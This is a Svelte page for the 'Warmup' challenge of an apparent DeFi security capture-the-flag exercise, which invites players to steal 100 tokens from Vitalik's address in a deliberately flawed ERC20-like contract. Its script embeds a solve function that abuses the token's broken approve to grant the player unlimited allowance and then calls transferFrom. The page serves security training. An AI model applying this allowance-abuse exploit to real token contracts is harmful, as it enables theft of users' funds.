<script>
    import { PUBLIC_SAMPLECHALLENGE } from "$env/static/public";

    import { signer, wallet } from "$lib/eth";
    import * as ethers from "ethers";

    import ChallengeElement from '../Challenge.svelte';
  
    const nChallenge = 0;
    const addressChallenge = PUBLIC_SAMPLECHALLENGE;
    
    const baseurl = 'https://github.com/eugenioclrc/DeFi-Security-Summit-Stanford/tree/master/challenges_sources/'
    const instancesDescriptions = [
      {href: baseurl+'/Challenge0.VToken.sol', text: 'Challenge0.VToken.sol'},
    ];

    $: if($wallet) {
        window.solve = async (vtoken) => {
            const abi = [
                "function approve(address _player, address _challenge, uint256 _signature) external",
                "function transferFrom(address, address, uint256) external",
            ];
            const c = new ethers.Contract(vtoken, abi, $signer);
            const vitalik = "0xd8dA6BF26964aF9D7eEd9e03E53415D37aA96045";
            let tx = await c.approve(vitalik, $wallet, ethers.constants.MaxUint256);
            await tx.wait(1);
            tx = await c.transferFrom(vitalik, $wallet, ethers.utils.parseEther("100"));
            await tx.wait(1);
        }
    }


  </script>
  <svelte:head>
    <title>Warmup</title>
  </svelte:head>
  
  <ChallengeElement nameChallenge="Warmup" {nChallenge} {addressChallenge} {instancesDescriptions}>
    <span slot="title">
      Challenge 1
      </span>
    <div slot="content">
        <blockquote>
            <p>Warm up</p>
          </blockquote>
          <p>
            Let's begin with a simple warm up. Our beloved Vitalik is the proud owner of <b>100 $VTLK</b>, which is a token that follows the ERC20 token standard. Or at least that is what it seems... 😉😉😉
          </p>
          <p>
            Is there a way for you to steal those tokens from him? 😈😈😈
          </p>
  
      Contracts;<br />
        <ul>
          {#each instancesDescriptions as {href, text}}
            <li><a class="link" href="{href}" target="_blank">{text}</a></li>
          {/each}
        </ul>
    </div>
  </ChallengeElement>
  

